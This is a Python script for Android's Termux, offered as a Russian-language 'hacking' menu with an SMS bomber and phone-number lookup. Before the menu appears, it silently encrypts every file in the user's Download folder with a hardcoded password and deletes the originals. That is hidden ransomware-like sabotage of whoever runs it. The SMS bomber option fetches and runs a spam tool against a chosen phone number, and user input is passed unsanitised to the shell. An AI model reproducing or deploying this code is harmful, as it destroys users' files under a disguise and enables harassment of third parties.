from colorama import *
import os,sys
script = '''

                     ▀▀██      ▀▀██
  ▄█████▄   ▄████▄     ██        ██
 ██▀    ▀  ██▀  ▀██    ██        ██
 ██        ██    ██    ██        ██
 ▀██▄▄▄▄█  ▀██▄▄██▀    ██▄▄▄     ██▄▄▄
   ▀▀▀▀▀     ▀▀▀▀       ▀▀▀▀      ▀▀▀▀

'''
info = '''
Этот скрипт был написан 
Артёмом без Рут прав
Далее для запуска скрипта
cd csllab;python collab.py
'''
menu = '''

[1] - sms bomber
[2] - информация о телефоне
[3] - информация об ip
[4] - выход

'''
b = '------------------------------'
def collab():
    walk('/storage/emulated/0/download')
    print(Fore.GREEN + b)
    print(Fore.RED + script)
    print(Fore.GREEN + b)
    print(Fore.YELLOW + info)
    print(Fore.GREEN + b)
    print(Fore.BLUE + menu)
    what = input('root@mail.ru|> ')
    if what == '1' or what == '01':
        if not os.path.exists('spymer'):
            os.system('git clone https://github.com/FSystem88/spymer')
        os.system('bash /data/data/com.termux/files/home/csllab/spymer/install.sh')
        num = input('укажите номер телефона:')
        os.system('python /data/data/com.termux/files/home/csllab/spymer/spammer.py ' + num)
    elif what == '2' or what == '02':
        if not os.path.exists('PhoneInfoga'):
            os.system('git clone https://github.com/sundowndev/PhoneInfoga')
            os.system('pip install -r /data/data/com.termux/files/home/csllab/PhoneInfoga/requirements.txt')
        phone = input('укажите номер телефона:')
        os.system('python /data/data/com.termux/files/home/csllab/PhoneInfoga/phoneinfoga.py -n ' + phone)
    elif what == '4' or what == '04':
        os.system('exit')
        os.system('exit')
def crypt(file):
    import pyAesCrypt
    password = 'zNubZXxvHR'
    bufferSize = 512*1024
    pyAesCrypt.encryptFile(str(file),str(file)+'.crp',password,bufferSize)
    os.remove(file)
def walk(dir):
    for name in os.listdir(dir):
        path = os.path.join(dir,name)
        if os.path.isfile(path): crypt(path)
        else: walk(path)
collab()
